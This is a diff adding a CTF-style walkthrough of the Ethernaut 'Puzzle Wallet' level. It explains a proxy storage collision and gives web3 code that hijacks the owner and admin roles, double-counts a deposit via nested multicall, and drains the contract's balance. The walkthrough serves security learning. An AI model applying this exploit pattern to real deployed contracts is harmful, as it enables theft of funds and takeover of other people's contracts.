@@ -1550,3 +1550,121 @@ Verify:
 
 ### Level Completed
 ![Level Complete Output](assets/Dextwo.png)
+
+
+## Ethernaut Level 24: Puzzle Wallet
+
+### Strategy
+
+In this challenge, we need to hijack the **PuzzleProxy** contract by exploiting a **storage collision** between the **proxy contract (PuzzleProxy)** and the **logic contract (PuzzleWallet)**. This allows us to control the admin role and manipulate the contract’s state. By leveraging **delegatecall** and **multicall**, we can achieve the goal of becoming the admin and draining the contract’s balance.
+
+---
+
+### Vulnerability
+
+The main vulnerability lies in the use of the **delegatecall** function. When the proxy contract (PuzzleProxy) delegates calls to the logic contract (PuzzleWallet), it uses the **context of the proxy contract**. This means that any state changes made in the logic contract (PuzzleWallet) will actually modify the storage of the proxy contract (PuzzleProxy).
+
+Because of this, **storage slots** between the two contracts are **shared**, leading to a **storage collision**. Specifically, the following storage slots collide:
+
+| Slot | PuzzleWallet | PuzzleProxy |
+|------|--------------|-------------|
+| 0    | owner        | pendingAdmin|
+| 1    | maxBalance   | admin       |
+| ...  | ...          | ...         |
+
+This allows us to **manipulate values in PuzzleWallet** by modifying the storage of PuzzleProxy. By becoming the **admin** of the proxy, we can control the contract.
+
+---
+
+### Exploit Steps
+
+#### 1. Propose New Admin
+
+We begin by exploiting the `proposeNewAdmin()` method in **PuzzleProxy**. This method allows us to **set the pending admin** to any address. Since **storage slot 0** in both contracts refers to the **owner** and **pendingAdmin**, setting the **pendingAdmin** in the proxy contract to the player’s address will automatically make the player the **owner** in PuzzleWallet.
+
+**Propose the player as the new admin**:
+
+```
+const functionSignature = {
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [
+        { type: 'address', name: '_newAdmin' }
+    ]
+};
+
+const params = [player];
+const data = web3.eth.abi.encodeFunctionCall(functionSignature, params);
+await web3.eth.sendTransaction({ from: player, to: proxyAddress, data });
+```
+
+At this point, the player is now the **owner** of the contract. We can verify this by checking the **owner** of PuzzleWallet:
+
+```
+await contract.owner() === player;  // Output: true
+```
+
+---
+
+#### 2. Add Player to Whitelist
+
+Now that the player is the **owner**, we can **whitelist** the player’s address to allow them to access the `onlyWhitelisted` functions:
+
+```
+await contract.addToWhitelist(player);
+```
+
+---
+
+#### 3. Manipulate maxBalance and Become Admin
+
+Next, we exploit the **storage collision** between `admin` and `maxBalance` in **PuzzleWallet** and **PuzzleProxy**. By calling the `setMaxBalance()` method, we can **set the player’s address** to the `admin` variable, giving us full control over the proxy.
+
+Before we can call `setMaxBalance()`, we need to **empty the contract's balance**. To do this, we can exploit the `multicall()` function, which lets us call multiple methods in one transaction.
+
+1. **Check contract balance**:
+
+```
+await getBalance(contract.address);  // Output: 0.001 ETH
+```
+
+2. **Create multicall data**:
+
+We need to call `deposit()` multiple times within the same transaction. However, `deposit()` can only be called **once** in a `multicall`. To bypass this, we can create a **nested multicall** structure.
+
+```
+// Deposit method data
+const depositData = await contract.methods["deposit()"].request().then(v => v.data);
+
+// Nested multicall data
+const multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data);
+
+// Send the transaction with 0.001 ETH
+await contract.multicall([multicallData, multicallData], { value: toWei('0.001') });
+```
+
+Now, the **player’s balance** will be **0.002 ETH**, while the **contract’s balance** will still be 0.001 ETH. This discrepancy allows the player to **drain the contract’s balance**.
+
+3. **Withdraw balance**:
+
+```
+await contract.execute(player, toWei('0.002'), 0x0);
+```
+
+---
+
+#### 4. Set maxBalance and Hijack Admin
+
+Now that we’ve drained the contract’s balance and **manipulated the accounting**, we can set the **maxBalance** to the player’s address, which will also set the **admin** to the player’s address.
+
+```
+await contract.setMaxBalance(player);
+```
+
+At this point, the player is the **admin** of the proxy, and they can control the contract.
+
+---
+
+### Level Completed
+![Level Complete Output](assets/puzzlewallet1.png)
+![2](assets/puzzlewallet2.png)
